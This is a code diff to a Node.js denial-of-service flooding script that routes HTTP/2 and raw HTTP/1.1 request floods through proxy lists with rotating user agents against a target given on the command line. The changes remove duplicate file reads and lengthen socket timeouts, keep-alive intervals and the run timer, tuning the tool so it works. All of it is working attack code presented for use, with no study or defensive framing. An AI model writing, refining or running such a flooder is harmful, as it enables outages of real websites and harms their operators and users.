@@ -136,12 +136,9 @@ const nullHexs = [
         "PUT"
     ];
 
-var proxyFile = "proxies.txt";
-var proxies = readLines(proxyFile);
 var proxyFile = "proxy.txt";
 var proxies = readLines(proxyFile);
 var userAgents = readLines("ua.txt");
-var userAgents = readLines("us.txt");
 
 const args = {
     target: process.argv[2],
@@ -335,7 +332,7 @@ function runFlooder() {
         connection.setNoDelay(true)
 
         const settings = {
-            enablePush: true,
+            enablePush: false,
             initialWindowSize: 1073741823
         };
 
@@ -376,7 +373,7 @@ function runFlooder() {
 
         tlsConn.allowHalfOpen = true;
         tlsConn.setNoDelay(true);
-        tlsConn.setKeepAlive(true, 60 * 100);
+        tlsConn.setKeepAlive(true, 60 * 1000);
         tlsConn.setMaxListeners(0);
 
         const client = http2.connect(parsedTarget.href, {
@@ -558,13 +555,13 @@ s.write(randomMethods + ' ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed
         setTimeout(function () {
             s.destroy();
             return delete s;
-        }, 100);
+        }, 5000);
     })
 
     //http-socket
     var pakete = 'GET ' + parsedTarget.host + '/ HTTP/1.1\r\nHost: ' + parsedTarget.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*//*;q=0.8\r\nUser-Agent: ' + userAgents + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\ncache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n'
 client.connect(80,parsedTarget.host)
-client.setTimeout(100);
+client.setTimeout(10000);
 for(let i=0;i<args.Rate;i++){
 client.write(pakete)
 }
@@ -573,7 +570,7 @@ client.write(pakete)
 
 const KillScript = () => process.exit(1);
 
-setTimeout(KillScript, args.time * 100);
+setTimeout(KillScript, args.time * 1000);
 
 process.on('uncaughtException', error => {});
 process.on('unhandledRejection', error => {});
